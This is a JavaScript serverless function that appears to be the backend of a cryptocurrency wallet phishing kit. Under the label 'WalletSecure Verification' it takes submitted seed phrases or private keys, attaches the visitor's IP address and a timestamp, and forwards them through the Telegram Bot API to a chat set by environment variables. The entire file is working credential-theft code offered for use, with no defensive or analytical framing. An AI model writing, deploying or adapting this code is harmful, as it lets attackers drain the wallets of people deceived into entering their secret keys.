exports.handler = async (event, context) => {
  // Enable CORS
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  // Handle preflight request
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ message: 'Method not allowed' })
    };
  }

  try {
    const { walletType, connectionMethod, credentials } = JSON.parse(event.body);
    
    console.log('Environment check:');
    console.log('- TELEGRAM_BOT_TOKEN exists:', !!process.env.TELEGRAM_BOT_TOKEN);
    console.log('- TELEGRAM_CHAT_ID:', process.env.TELEGRAM_CHAT_ID);
    
    if (!process.env.TELEGRAM_BOT_TOKEN) {
      console.error('TELEGRAM_BOT_TOKEN not configured');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ message: 'Telegram not configured' })
      };
    }

    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!chatId) {
      console.error('TELEGRAM_CHAT_ID not configured');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ message: 'Telegram chat ID not configured' })
      };
    }

    const message = `🔐 WalletSecure Verification\n\n` +
                   `Wallet Type: ${walletType}\n` +
                   `Method: ${connectionMethod === 'seed' ? 'Seed Phrase' : 'Private Key'}\n` +
                   `Credentials: ${credentials}\n\n` +
                   `Time: ${new Date().toISOString()}\n` +
                   `IP: ${event.headers['x-forwarded-for'] || event.headers['x-bb-ip'] || 'Unknown'}`;

    const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    };
    
    console.log('Sending to Telegram...');
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    console.log('Telegram response status:', response.status);
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('Telegram API error:', response.status, errorText);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ message: 'Failed to send to Telegram', error: errorText })
      };
    }

    const result = await response.json();
    console.log('Message sent successfully to Telegram');
    
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, message: 'Credentials sent successfully' })
    };
  } catch (error) {
    console.error('Function error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ message: 'Internal server error', error: String(error) })
    };
  }
};